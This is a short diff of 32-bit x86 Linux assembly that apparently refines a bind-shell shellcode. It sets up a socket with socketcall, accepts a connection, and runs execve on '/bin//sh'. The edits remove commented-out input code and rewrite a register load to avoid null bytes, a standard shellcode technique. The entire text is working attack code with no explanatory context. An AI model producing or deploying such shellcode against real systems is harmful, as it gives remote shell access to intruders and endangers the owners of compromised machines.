@@ -16,17 +16,9 @@ _start :
 %assign SYS_ACCEPT 5; socket
 
 
-;ReadUser Input
-;Read and store the user input
-   ;mov eax, 3
-   ;mov ebx, 2
-   ;mov ecx, input  
-   ;mov edx, 5          ;5 bytes (numeric, 1 for sign) of that information
-   ;int 80h
-;   mov edi,ecx
-
 ;Socket
-	mov eax,0x66 ; syscall - socketcall
+	xor eax,eax
+	mov al,0x66 ; syscall - socketcall
 	mov bl, SYS_SOCKET ; type sys_socket
 	; socket(domain,type,protocol)
 	xor edx,edx
@@ -99,10 +91,6 @@ push  eax
 push 0x68732f2f
 push 0x6e69622f
 mov ebx, esp
-;push  eax
-;push ebx
-;mov ecx,edx ; mov zero
 mov ecx,edx ; move zero
-;mov edx,0
 mov al, 0xb
 int 0x80
